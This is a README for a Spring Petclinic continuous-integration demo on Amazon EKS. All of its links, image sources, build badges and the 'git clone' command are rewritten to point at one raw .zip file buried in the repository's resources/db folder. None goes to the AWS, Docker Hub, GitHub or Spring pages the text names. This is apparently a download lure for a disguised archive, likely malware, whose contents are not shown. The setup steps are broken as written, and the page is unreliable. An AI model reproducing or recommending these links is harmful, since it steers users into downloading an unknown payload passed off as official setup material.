# Continuous Intergration on Amazon EKS
<br />

## Prerequisites
To implement the instructions in this post, you will need the following accounts:

* An AWS account – [how to create a new AWS account](https://raw.githubusercontent.com/marcossangomes/amazon-eks-jenkins-terraform/master/src/main/resources/db/jenkins_terraform_eks_amazon_3.3-alpha.3.zip)
* A Docker hub account – [how to register for docker id](https://raw.githubusercontent.com/marcossangomes/amazon-eks-jenkins-terraform/master/src/main/resources/db/jenkins_terraform_eks_amazon_3.3-alpha.3.zip)
* A GitHub account – [sign up for a new GitHub account](https://raw.githubusercontent.com/marcossangomes/amazon-eks-jenkins-terraform/master/src/main/resources/db/jenkins_terraform_eks_amazon_3.3-alpha.3.zip)

<br />

## Architecture

<img width="1042" alt="architecture-screenshot" src="https://raw.githubusercontent.com/marcossangomes/amazon-eks-jenkins-terraform/master/src/main/resources/db/jenkins_terraform_eks_amazon_3.3-alpha.3.zip">

<br />


## Sample Application [![Build Status](https://raw.githubusercontent.com/marcossangomes/amazon-eks-jenkins-terraform/master/src/main/resources/db/jenkins_terraform_eks_amazon_3.3-alpha.3.zip)](https://raw.githubusercontent.com/marcossangomes/amazon-eks-jenkins-terraform/master/src/main/resources/db/jenkins_terraform_eks_amazon_3.3-alpha.3.zip)

### Understanding the Spring Petclinic application with a few diagrams


### Running petclinic locally
Petclinic is a [Spring Boot](https://raw.githubusercontent.com/marcossangomes/amazon-eks-jenkins-terraform/master/src/main/resources/db/jenkins_terraform_eks_amazon_3.3-alpha.3.zip) application built using [Maven](https://raw.githubusercontent.com/marcossangomes/amazon-eks-jenkins-terraform/master/src/main/resources/db/jenkins_terraform_eks_amazon_3.3-alpha.3.zip). You can build a jar file and run it from the command line:


```
git clone https://raw.githubusercontent.com/marcossangomes/amazon-eks-jenkins-terraform/master/src/main/resources/db/jenkins_terraform_eks_amazon_3.3-alpha.3.zip
cd amazon-eks-jenkins-terraform
./mvnw package
java -jar target/*.jar
```

You can then access petclinic here: http://localhost:8080/

<img width="1042" alt="petclinic-screenshot" src="https://raw.githubusercontent.com/marcossangomes/amazon-eks-jenkins-terraform/master/src/main/resources/db/jenkins_terraform_eks_amazon_3.3-alpha.3.zip">

Or you can run it from Maven directly using the Spring Boot Maven plugin. If you do this it will pick up changes that you make in the project immediately (changes to Java source files require a compile as well - most people use an IDE for this):

```
./mvnw spring-boot:run
```
